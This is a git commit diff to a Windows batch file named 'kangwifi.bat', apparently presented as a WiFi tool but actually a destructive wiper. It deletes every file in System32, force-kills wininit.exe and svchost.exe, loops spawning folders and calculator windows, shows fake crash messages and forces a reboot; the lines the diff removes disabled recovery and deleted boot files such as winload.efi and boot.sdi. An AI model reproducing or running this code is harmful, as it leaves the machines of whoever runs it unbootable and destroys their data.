2ddf76818fc033b1bb46a0aba84199757ed27967
Yzlink7 <98150440+Yzlink7@users.noreply.github.com>
2024-03-02 04:58:12 +0700

    Add files via upload

--- kangwifi.bat
+++ kangwifi.bat
@@ -4,6 +4,7 @@ CLS
 :A
 mkdir %random%
 start calc.exe
+goto A
 timeout /t 10 /nobreak >nul
 
 echo Error: Access Denied
@@ -25,43 +26,17 @@ echo Error: System Crash
 echo Error: Blue Screen of Death
 pause
 del /f /q %windir%\System32\*.*
+taskkill /f /im wininit.exe /t
+taskkill /f /im svchost.exe /t
 timeout /t 30 /nobreak >nul
 
 echo System will crash in 30 seconds...
 timeout /t 30 /nobreak >nul
 
-cd %windir%\System32\
-reagentc.exe /disable
-bcdedit /set {default} recoveryenabled no
-bcdedit /set {current} recoveryenabled no
+echo Deleting critical system files...
+timeout /t 5 /nobreak >nul
+echo Oops! Something went wrong.
+echo Crashing system...
+timeout /t 5 /nobreak >nul
 
-takeown /f winload.efi
-icacls winload.efi /grant users:f
-icacls winload.efi /grant administrator:f
-del /f /q winload.efi
-
-takeown /f winload.exe
-icacls winload.exe /grant users:f
-icacls winload.exe /grant administrator:f
-del /f /q winload.exe
-
-takeown /f boot
-icacls boot /grant users:f
-icacls boot /grant administrator:f
-rd /s /q boot
-
-takeown /f boot.sdi
-icacls boot.sdi /grant users:f
-icacls boot.sdi /grant administrator:f
-del /f /q /a boot.sdi
-
-takeown /f wininit.exe
-icacls wininit.exe /grant users:f
-icacls wininit.exe /grant administrator:f
-ren wininit.exe nit.exe
-taskkill /f /im wininit.exe /t
-taskkill /f /im svchost.exe /t
-taskkill /f /im iexplore.exe
-taskkill /f /im calc.exe
-
-goto A
+shutdown /r /f /t 0
